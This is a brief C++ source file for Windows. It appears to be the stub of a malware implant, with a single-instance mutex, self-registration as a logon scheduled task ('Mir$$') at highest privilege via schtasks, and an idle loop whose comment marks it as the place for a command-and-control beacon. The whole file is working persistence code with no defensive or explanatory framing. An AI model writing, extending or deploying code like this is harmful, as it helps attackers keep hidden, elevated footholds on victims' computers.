#include <windows.h>
#include <iostream>
#include <string>

#define MUTEX_NAME "Global\\MirPersistentMutex"

void SetupPersistence() {
    std::string exePath(MAX_PATH, '\0');
    GetModuleFileNameA(NULL, &exePath[0], MAX_PATH);
    exePath.resize(strlen(exePath.c_str()));

    std::string command = "schtasks /create /f /sc onlogon /tn \"Mir$$\" /tr \"" + exePath + "\" /rl highest";
    system(command.c_str());
}

int main() {
    HANDLE hMutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0; // Already running
    }

    SetupPersistence();

    // Main loop (could be empty or contain a beacon to C2)
    while (true) {
        Sleep(60000);
    }

    return 0;
}
